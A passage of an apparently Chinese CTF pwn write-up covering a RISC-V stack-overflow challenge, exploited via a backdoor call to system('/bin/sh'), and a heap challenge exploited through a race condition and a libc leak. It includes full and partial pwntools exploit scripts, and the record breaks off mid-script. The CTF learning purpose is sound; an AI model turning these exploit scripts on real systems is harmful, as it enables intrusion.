<h2 id="risky-login"><a href="#risky-login" class="headerlink" title="risky_login"></a>risky_login</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(GNU libc)</span> stable release version 2.37.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwn: ELF <span class="number">64</span>-bit LSB executable, UCB RISC-V, RVC, <span class="keyword">double</span>-<span class="keyword">float</span> ABI, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib/ld-linux-riscv64-lp64d.so<span class="number">.1</span>, <span class="keyword">for</span> GNU/Linux <span class="number">4.15</span><span class="number">.0</span>, stripped              </span><br><span class="line">[!] Could <span class="keyword">not</span> populate PLT: AttributeError: arch must be one of [<span class="string">&#x27;aarch64&#x27;</span>, <span class="string">&#x27;alpha&#x27;</span>, <span class="string">&#x27;amd64&#x27;</span>, <span class="string">&#x27;arm&#x27;</span>, <span class="string">&#x27;avr&#x27;</span>, <span class="string">&#x27;cris&#x27;</span>, <span class="string">&#x27;i386&#x27;</span>, <span class="string">&#x27;ia64&#x27;</span>, <span class="string">&#x27;m68k&#x27;</span>, <span class="string">&#x27;mips&#x27;</span>, <span class="string">&#x27;mips64&#x27;</span>, <span class="string">&#x27;msp430&#x27;</span>, <span class="string">&#x27;none&#x27;</span>, <span class="string">&#x27;powerpc&#x27;</span>, <span class="string">&#x27;powerpc64&#x27;</span>, <span class="string">&#x27;riscv&#x27;</span>, <span class="string">&#x27;s390&#x27;</span>, <span class="string">&#x27;sparc&#x27;</span>, <span class="string">&#x27;sparc64&#x27;</span>, <span class="string">&#x27;thumb&#x27;</span>, <span class="string">&#x27;vax&#x27;</span>]</span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/桌面/shellcoe/pwn&#x27;</span></span><br><span class="line">    Arch:     em_riscv<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x10000</span>)</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，NX</li>
</ul>
<p>直接运行程序会出现以下报错：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">riscv64-binfmt-P: Could <span class="keyword">not</span> open <span class="string">&#x27;/lib/ld-linux-riscv64-lp64d.so.1&#x27;</span>: No such file <span class="keyword">or</span> directory</span><br></pre></td></tr></table></figure>
<ul>
<li>解决办法如下：<a target="_blank" rel="noopener" href="https://blog.csdn.net/bebebug/article/details/127829361">qemu-riscv64: could not open ‘/lib/ld-linux-riscv64-lp64d.so.1 CSDN博客</a> </li>
</ul>
<p>关于 RISC-V 架构可以参考以下网站：</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://staff.ustc.edu.cn/~llxx/cod/reference_books/RISC-V-Reader-Chinese-v2p12017.pdf">RISC-V手册 (ustc.edu.cn)</a> </li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>由于 IDA 对 RISC-V 架构的程序分析出错，GDB 实际上是在调试 qemu，这里只能通过分析静态汇编代码来进行入侵（目测栈溢出）</p>
<p>有后门：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000012345770</span>                               loc_12345770:                           # CODE XREF: sub_123456EE+<span class="number">66</span>↑j</span><br><span class="line">.text:<span class="number">0000000012345770</span> <span class="number">13</span> <span class="number">85</span> <span class="number">81</span> <span class="number">87</span>                   la              a0, buf</span><br><span class="line">.text:<span class="number">0000000012345774</span> <span class="number">97</span> B0 CC ED E7 <span class="number">80</span> C0 FE       call            system</span><br></pre></td></tr></table></figure>
<p>由于不熟悉 RISC-V 架构，很难直接从汇编代码中看出是否有栈溢出，因此最简单的方式就是直接输入大数据看看是否会 crash</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sla(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x7</span>)</span><br><span class="line">sla(<span class="string">&quot;words&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x100</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/home/yhellow/.local/lib/python3.10/site-packages/pwnlib/tubes/process.py&quot;</span>, line <span class="number">746</span>, in close</span><br><span class="line">    fd.close()</span><br><span class="line">BrokenPipeError: [Errno <span class="number">32</span>] Broken pipe</span><br></pre></td></tr></table></figure>
<ul>
<li>Broken pipe，证明有栈溢出漏洞</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>由于不确定 padding 的填充数量，我们可以写一个简单的脚本来进行测试：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">find_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x180</span>):</span><br><span class="line">    payload = <span class="string">&quot;a&quot;</span>*(<span class="number">0x180</span>-i)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = process(challenge)</span><br><span class="line">        sla(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">        sa(<span class="string">&quot;words&quot;</span>,payload)</span><br><span class="line">        ru(<span class="string">&quot;too long&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        find_list.append(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">        success(<span class="string">&quot;find: &quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"><span class="built_in">print</span>(find_list)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&#x27;0x107&#x27;</span>, <span class="string">&#x27;0x106&#x27;</span>, <span class="string">&#x27;0x105&#x27;</span>, <span class="string">&#x27;0x104&#x27;</span>, <span class="string">&#x27;0x103&#x27;</span>, <span class="string">&#x27;0x102&#x27;</span>, <span class="string">&#x27;0x101&#x27;</span>, <span class="string">&#x27;0x100&#x27;</span>, <span class="string">&#x27;0x27&#x27;</span>, <span class="string">&#x27;0x25&#x27;</span>, <span class="string">&#x27;0x24&#x27;</span>, <span class="string">&#x27;0x23&#x27;</span>, <span class="string">&#x27;0x22&#x27;</span>, <span class="string">&#x27;0x21&#x27;</span>, <span class="string">&#x27;0x20&#x27;</span>, <span class="string">&#x27;0x1f&#x27;</span>, <span class="string">&#x27;0x1e&#x27;</span>, <span class="string">&#x27;0x1d&#x27;</span>, <span class="string">&#x27;0x1c&#x27;</span>, <span class="string">&#x27;0x1b&#x27;</span>, <span class="string">&#x27;0x1a&#x27;</span>, <span class="string">&#x27;0x19&#x27;</span>, <span class="string">&#x27;0x18&#x27;</span>, <span class="string">&#x27;0x17&#x27;</span>, <span class="string">&#x27;0x16&#x27;</span>, <span class="string">&#x27;0x15&#x27;</span>, <span class="string">&#x27;0x14&#x27;</span>, <span class="string">&#x27;0x13&#x27;</span>, <span class="string">&#x27;0x12&#x27;</span>, <span class="string">&#x27;0x11&#x27;</span>, <span class="string">&#x27;0x10&#x27;</span>, <span class="string">&#x27;0xf&#x27;</span>, <span class="string">&#x27;0xe&#x27;</span>, <span class="string">&#x27;0xd&#x27;</span>, <span class="string">&#x27;0xc&#x27;</span>, <span class="string">&#x27;0xb&#x27;</span>, <span class="string">&#x27;0xa&#x27;</span>, <span class="string">&#x27;0x9&#x27;</span>, <span class="string">&#x27;0x8&#x27;</span>, <span class="string">&#x27;0x7&#x27;</span>, <span class="string">&#x27;0x6&#x27;</span>, <span class="string">&#x27;0x5&#x27;</span>, <span class="string">&#x27;0x4&#x27;</span>, <span class="string">&#x27;0x3&#x27;</span>, <span class="string">&#x27;0x2&#x27;</span>, <span class="string">&#x27;0x1&#x27;</span>]</span><br></pre></td></tr></table></figure>
<ul>
<li><code>[0x1,0x27]</code> 都是由于字节数太小而没有触发报错，从 <code>0x100</code> 开始都是 crash</li>
<li>基本确定了 padding 的大小就是 <code>0x100</code></li>
</ul>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge,&quot;b*0x012345826\n&quot;)</span></span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.16.159.33&#x27;</span>,<span class="string">&#x27;58012&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b*0x012345826\n&quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x18BD)\nb *$rebase(0x1A02)\n&quot;)</span></span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">find_list = []</span></span><br><span class="line"><span class="string">for i in range(0x180):</span></span><br><span class="line"><span class="string">    payload = &quot;a&quot;*(0x180-i)</span></span><br><span class="line"><span class="string">    try:</span></span><br><span class="line"><span class="string">        p = process(challenge)</span></span><br><span class="line"><span class="string">        sla(&quot;name&quot;,&quot;a&quot;)</span></span><br><span class="line"><span class="string">        sa(&quot;words&quot;,payload)</span></span><br><span class="line"><span class="string">        ru(&quot;too long&quot;)</span></span><br><span class="line"><span class="string">    except:</span></span><br><span class="line"><span class="string">        find_list.append(hex(len(payload)))</span></span><br><span class="line"><span class="string">        success(&quot;find: &quot;+str(len(payload)))</span></span><br><span class="line"><span class="string">        p.close()</span></span><br><span class="line"><span class="string">        continue</span></span><br><span class="line"><span class="string">print(find_list)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x12345770</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x100</span> + p64(backdoor)</span><br><span class="line">sla(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">sa(<span class="string">&quot;words&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.35</span><span class="number">-0u</span>buntu3<span class="number">.1</span>)</span> stable release version 2.35.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">heap: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">889e7948</span>d634cc86970feeb81c2a72787086723b, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>条件竞争：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( pthread_create(&amp;newthread, <span class="number">0LL</span>, (<span class="keyword">void</span> *(*)(<span class="keyword">void</span> *))(&amp;func_list)[op], chunk) )</span><br><span class="line">&#123;</span><br><span class="line">  perror(<span class="string">&quot;Thread creation failed&quot;</span>);</span><br><span class="line">  ++times;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在 edit 模块中的 sleep 函数也在暗示条件竞争：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index = atoi(data);</span><br><span class="line">chunk = *((_DWORD *)chunk_list[index] + <span class="number">2</span>);</span><br><span class="line">sleep(<span class="number">1u</span>);</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>由于 edit 模块有延迟，也就是说 edit 模块效验 len 的代码和使用 len 的代码是分开的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">index = atoi(data);</span><br><span class="line">len = chunk_list[index]-&gt;len;</span><br><span class="line">sleep(<span class="number">1u</span>);</span><br><span class="line"><span class="keyword">if</span> ( index &lt;= <span class="number">0xF</span> &amp;&amp; chunk_list[index] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;paper index: %d\n&quot;</span>, index);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the new paper content&quot;</span>);</span><br><span class="line">  <span class="built_in">strncpy</span>(chunk_list[index]-&gt;data, dest, len);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在 edit 模块效验完 len 并 sleep 的这段时间里，其他的进程可能会修改 <code>chunk_list[index]</code>，使更小的 chunk 写入其中，导致后续的 <code>strncpy</code> 发生堆溢出</p>
<p>利用堆溢出，我们可以覆盖相邻 chunk 内部指针的低位，最后的泄露地址如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">114</span>:<span class="number">08</span>a0│  <span class="number">0x7f3bc40008a0</span> —▸ <span class="number">0x7f3bc9619c80</span> (main_arena) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">115</span>:<span class="number">08</span>a8│  <span class="number">0x7f3bc40008a8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">116</span>:<span class="number">08b</span>0│  <span class="number">0x7f3bc40008b0</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>进行泄露的脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">b&quot;a&quot;</span>*(<span class="number">0x68</span>-<span class="number">6</span>))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x58</span>+<span class="string">b&quot;b&quot;</span>*<span class="number">8</span>+p16(<span class="number">0x8a0</span>))</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&quot;1&quot;</span>*<span class="number">0x50</span>)</span><br><span class="line">add(<span class="string">b&quot;2&quot;</span>*<span class="number">0x50</span>)</span><br><span class="line">add(<span class="string">b&quot;3&quot;</span>*<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&quot;0&quot;</span>*<span class="number">0x50</span>)</span><br><span class="line">ru(<span class="string">&quot;Input the new paper content&quot;</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">&quot;paper content: &quot;</span>)</span><br><span class="line">leak_addr = u64(ru(<span class="string">&quot;\n&quot;</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x219c80</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
<p>由于程序的 libc 版本过高 <code>free_hook</code> 等常规手段失效，现在只有以下3个选择：</p>
<ul>
<li>打 IO</li>
<li>打 exit_hook</li>
<li>打栈</li>
<li>打 libc got</li>
</ul>
<p>由于程序对堆的控制比较有限，因此先不考虑打 IO，而高版本 libc 的 exit_hook 也不好找，因此这里我们先考虑打栈</p>
<p>在有多线程的题目中一般不考虑用 TLS 获取栈地址，而是使用 <code>__libc_argv</code> 环境变量：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;__libc_argv</span><br><span class="line">$<span class="number">4</span> = (<span class="keyword">char</span> ***) <span class="number">0x7fe52da1aa20</span> &lt;__libc_argv&gt;</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x7fe52da1aa20</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fe52da1aa20</span> (__libc_argv) —▸ <span class="number">0x7ffea2946de8</span> —▸ <span class="number">0x7ffea29483df</span> ◂— <span class="number">0x4400706165682f2e</span> <span class="comment">/* &#x27;./heap&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7fe52da1aa28</span> (__libc_argc) ◂— <span class="number">0x1</span></span><br></pre></td></tr></table></figure>
<p>最后一个问题就是 one_gadget 的条件比较苛刻只能写入 <code>system</code>，但 <code>system</code> 在调用后可能会发生栈错误，在 GDB 的配合下勉强可以打通</p>
<p>非完整 exp 如下：（这个 exp 打通率很低）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./heap1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-3.35.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x18BD)\nb *$rebase(0x1A02)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Your chocie:&quot;</span>,<span 